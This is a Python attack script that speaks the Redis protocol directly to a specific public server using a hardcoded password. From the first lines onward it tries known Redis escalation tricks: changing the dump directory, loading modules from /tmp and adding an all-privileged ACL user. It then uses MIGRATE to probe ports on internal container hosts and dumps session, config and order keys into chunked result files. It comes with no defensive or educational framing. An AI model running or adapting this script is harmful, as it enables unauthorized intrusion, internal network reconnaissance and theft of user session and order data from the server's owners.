import socket,time,urllib.request,traceback
OUT=[]
def log(s):
    print(s,flush=True); OUT.append(str(s))
class R:
    def __init__(s,host,port,pw,to=10):
        s.s=socket.create_connection((host,port),to); s.s.settimeout(to); s.buf=b""
        if pw: s.cmd("AUTH",pw)
    def _fill(s):
        c=s.s.recv(65536)
        if not c: raise IOError("closed")
        s.buf+=c
    def _parse(s):
        while True:
            if not s.buf: s._fill()
            t=s.buf[:1]; nl=s.buf.find(b"\r\n")
            if t in (b"+",b"-",b":"):
                if nl<0: s._fill(); continue
                line=s.buf[1:nl]; s.buf=s.buf[nl+2:]
                if t==b"-": return {"err":line.decode('utf-8','replace')}
                return line.decode('utf-8','replace')
            if t==b"$":
                while nl<0: s._fill(); nl=s.buf.find(b"\r\n")
                n=int(s.buf[1:nl]); s.buf=s.buf[nl+2:]
                while len(s.buf)<n+2: s._fill()
                d=s.buf[:n]; s.buf=s.buf[n+2:]
                return d.decode('utf-8','replace')
            if t==b"*":
                while nl<0: s._fill(); nl=s.buf.find(b"\r\n")
                n=int(s.buf[1:nl]); s.buf=s.buf[nl+2:]
                return [s._parse() for _ in range(n)]
            return "?"+repr(s.buf[:60])
    def cmd(s,*a):
        rq=b"*%d\r\n"%len(a)
        for x in a:
            x=x if isinstance(x,bytes) else str(x).encode()
            rq+=b"$%d\r\n"%len(x)+x+b"\r\n"
        s.s.sendall(rq); return s._parse()
    def close(s):
        try: s.s.close()
        except: pass
def main():
    log("== RUNNER %s utc=%s egress=%s"%(socket.gethostname(),time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),urllib.request.urlopen("https://ifconfig.me/ip",timeout=8).read().decode()))
    r=R("103.40.14.130",6379,"4GRZhjQ4xhdfNXG4",10)
    log("AUTH re-check -> %r"%r.cmd("PING"))
    for name,c in [("eval dir",("EVAL","return redis.call('config','set','dir','/tmp')",0)),
                   ("eval dbfn",("EVAL","return redis.call('config','set','dbfilename','x.rdb')",0)),
                   ("eval pcall module",("EVAL","local ok,e=pcall(function() return redis.call('module','load','/tmp/x.so') end) return tostring(ok)..'|'..tostring(e)",0)),
                   ("eval os getenv",("EVAL","return tostring(redis.call('get','x'))",0)),
                   ("debug jmap",("DEBUG","JMAP")),
                   ("debug segfault-deny",("DEBUG","SET-ACTIVE-EXPIRE","0")),
                   ("function list",("FUNCTION","LIST")),
                   ("module loadex",("MODULE","LOADEX","/tmp/x.so","CONFIG","name","z")),
                   ("acl setuser",("ACL","SETUSER","zz734","on",">probe123","+@all","~*")),
                   ]:
        cs=[str(x) for x in c]
        try: log("  [%s] -> %r"%(name,str(r.cmd(*c))[:300]))
        except Exception as e: log("  [%s] EXC %s"%(name,e))
    # MIGRATE tcp oracle from this container netns (172.18.0.5)
    log("== MIGRATE connect oracle (source = redis container 172.18.0.5) ==")
    r.cmd("SET","zz734probe","v"); r.cmd("EXPIRE","zz734probe",120)
    tg=[("127.0.0.1",32311),("172.18.0.1",32311),("172.18.0.1",24678),("172.18.0.1",5278),("172.18.0.1",22),
        ("172.18.0.1",3101),("172.18.0.1",5215),("172.18.0.1",13021),("172.18.0.1",23334),("103.40.14.130",32311),
        ("103.40.14.130",24678),("172.18.0.7",80),("172.18.0.2",6379)]
    for h,p in tg:
        t0=time.time()
        try:
            res=r.cmd("MIGRATE",h,p,"zz734probe","0","1200")
            log("  %s:%d -> %r (%.2fs)"%(h,p,str(res)[:160],time.time()-t0))
        except Exception as e:
            log("  %s:%d EXC %s"%(h,p,e))
    try: r.cmd("DEL","zz734probe")
    except Exception: pass
    log("== key dump (sessions/configs) ==")
    ks=r.cmd("KEYS","*")
    log("KEYS %d"%len(ks))
    for k in ks:
        if not any(x in k for x in ("session","config","order_2026","user_order")): continue
        try:
            t=r.cmd("TYPE",k)
            if t=="string": v=r.cmd("GET",k)
            elif t=="hash": v=r.cmd("HGETALL",k)
            elif t=="list": v=r.cmd("LRANGE",k,"0","10")
            elif t=="set": v=r.cmd("SMEMBERS",k)
            elif t=="zset": v=r.cmd("ZRANGE",k,"0","10")
            else: v=t
            log("  K %s type=%s ttl=%s val=%r"%(k,t,r.cmd("TTL",k),str(v)[:900]))
        except Exception as e: log("  K %s err %s"%(k,e))
    r.close()
    blob="\n".join(OUT); open("zz-734c-result.txt","w").write(blob)
    for i in range(0,len(blob),30000): open("zz-734c-part%d.txt"%(i//30000),"w").write(blob[i:i+30000])
    log("PARTS %d"%(len(blob)//30000+1))
try: main()
except Exception:
    print(traceback.format_exc()); open("zz-734c-result.txt","w").write("\n".join(OUT)+"\n"+traceback.format_exc())
